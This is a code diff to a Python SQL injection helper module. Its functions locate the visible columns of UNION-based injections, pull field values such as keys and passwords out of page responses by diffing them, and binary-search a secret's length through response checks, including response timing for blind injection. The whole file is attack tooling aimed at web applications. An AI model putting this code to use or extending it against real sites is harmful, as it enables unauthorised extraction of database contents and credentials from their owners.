@@ -1,6 +1,8 @@
 from bs4 import BeautifulSoup
-import re
 import difflib
+import re
+import time
+from typing import Callable
 from itertools import compress
 from connect import my_request as req
 
@@ -122,7 +124,8 @@ def find_visible_columns_and_param(url: str, columns: int, data: dict, finds: li
     # Deleting form content
     html_visible = html_visible[:html_visible.find('<form')] + \
         html_visible[html_visible.find('/form>') + 6:]
-    # find param
+
+    # Find param
     keys = []
     for field in finds:
         if type_sqli == 2:
@@ -174,127 +177,6 @@ def find_visible_columns_and_param(url: str, columns: int, data: dict, finds: li
     return keys
 
 
-def find_visible_columns(url: str, columns: int, payload: str, p: str, finds: list,
-                         cook={}, encode=none_func, method='get') -> list:
-    '''
-    The function finds the columns displayed on the web page after request.
-    '''
-
-    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
-    print('list of columns: ', list_of_columns)
-    pl = payload % (','.join(list_of_columns))
-    if encode != none_func:
-        print(pl)
-    param = {p: encode(pl)}
-
-    if method == 'get':
-        html_visible = req.get_request(url, param, cook)
-    elif method == 'post':
-        html_visible = req.post_request(url, param, cook)
-    else:
-        print('request method is not understanding')
-        return False
-
-    list_of_visible = [
-        text for text in list_of_columns if text in html_visible]
-
-    if not list_of_visible:
-        print('not find visible column')
-        exit(1)
-    print('visible columns: ', list_of_visible)
-
-    # find param
-    keys = []
-    for field in finds:
-        list_of_columns[int(list_of_visible[0][0]) - 1] = field
-        pl = payload % (','.join(list_of_columns))
-        if encode != none_func:
-            print(pl)
-        param = {p: encode(pl)}
-
-        if method == 'get':
-            html_response = req.get_request(url, param, cook)
-        elif method == 'post':
-            html_response = req.post_request(url, param, cook)
-        else:
-            print('request method is not understanding')
-            return False
-
-        # Find differens
-        index = 0
-        key = []
-        while html_response[index] == html_visible[index]:
-            index += 1
-        new_index = index
-        # + 3 because 111,222 etc in request
-        while html_response[new_index] != html_visible[index + 3]:
-            key.append(html_response[new_index])
-            new_index += 1
-        print('key: ', ''.join(key))
-        keys.append(''.join(key))
-
-    return keys
-
-
-def find_param(url: str, columns: int, field: str, list_of_visible: list, html_visible: str,
-               payload: str, p: str, cook={}, encode=none_func) -> list:
-    '''
-    The function finds desired data in visible columns in the response.
-    '''
-
-    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
-    list_of_columns[int(list_of_visible[0][0]) - 1] = field
-    pl = payload % (','.join(list_of_columns))
-    if encode != none_func:
-        print(pl)
-    param = {p: encode(pl)}
-
-    html_response = req.get_request(url, param, cook)
-
-    # Find differens
-    index = 0
-    key = []
-    while html_response[index] == html_visible[index]:
-        index += 1
-    new_index = index
-    # because 111,222 etc in request
-    while html_response[new_index] != html_visible[index + 3]:
-        key.append(html_response[new_index])
-        new_index += 1
-    print('key: ', ''.join(key))
-
-    return ''.join(key)
-
-
-def find_column_position(url: str, list_of_columns: list, payload: str,
-                         p: str, finds: str, cook={}) -> list:
-    '''
-    tmp for blind sql
-    '''
-    max_rows = 10
-    m_row = 0
-    index_m_row = 0
-    for i in range(len(list_of_columns)):
-        tmp = list_of_columns[i]
-        list_of_columns[i] = finds
-        param = {p: payload % (','.join(list_of_columns))}
-        response = req.get_request(url, param, cook)
-        soup = BeautifulSoup(response, 'html.parser')
-        ret = soup.find(string=re.compile('rows'))
-        # Find max of visible rows
-        for j in range(max_rows):
-            if str(j) in ret:
-                if j > m_row:
-                    m_row = j
-                    index_m_row = i
-        list_of_columns[i] = tmp
-    if m_row:
-        list_of_columns[index_m_row] = finds
-        return [m_row, list_of_columns]
-    print('column position not found')
-    exit(1)
-
-
 def try_auth(url: str, columns: int, data: str,
              finds: str, cook={}) -> str:
     '''
@@ -317,15 +199,21 @@ def try_auth(url: str, columns: int, data: str,
     return False
 
 
-def find_key_len(url: str, payload: str,
-                 p: str, m_row: str, cook={}) -> int:
+def find_key_len(url: str, payload: dict, check_func: Callable, cook={},
+                 method='get', print_resp=False) -> int:
     left = -1
-    right = 30
+    right = 32
+    payload_tmp = payload.copy()
     while right > left + 1:
         middle = (left + right) // 2
-        param = {p: payload % f'>{middle},1,0)'}
-        response = req.get_request(url, param, cook)
-        if m_row in response:
+        for k, v in sorted(payload.items()):
+            if '%s' in v:
+                payload_tmp[k] = v % middle
+        t1 = time.time()
+        response = req.my_request(
+            url, payload_tmp, cook, method, print_resp, 1)
+        t2 = time.time()
+        if check_func(response, t1, t2):
             left = middle
         else:
             right = middle
@@ -358,12 +246,5 @@ def extract_pass(response: str, pass_r: str) -> str:
     return passw
 
 
-def save_cookies(cooks: dict):
-    try:
-        with open('cooks.pickle', 'wb') as f:
-            pickle.dump(cooks, f)
-    except:
-        print('can not write cookies')
-        return False
 
 
